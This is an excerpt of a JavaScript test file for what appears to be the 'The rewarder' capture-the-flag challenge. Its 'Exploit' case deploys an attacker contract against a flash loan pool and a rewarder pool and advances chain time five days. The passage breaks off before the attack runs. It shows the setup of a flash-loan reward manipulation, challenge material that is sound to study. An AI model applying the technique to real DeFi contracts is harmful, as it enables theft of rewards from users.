...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const TheRewarderPoolExploit = await ethers.getContractFactory('TheRewarderPoolExploit', attacker);
        this.exploit = await TheRewarderPoolExploit.deploy(TOKENS_IN_LENDER_POOL, this.flashLoanPool.address, this.rewarderPool.address);
        
        // increase 5 days for evm
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);

        // start attack by contract
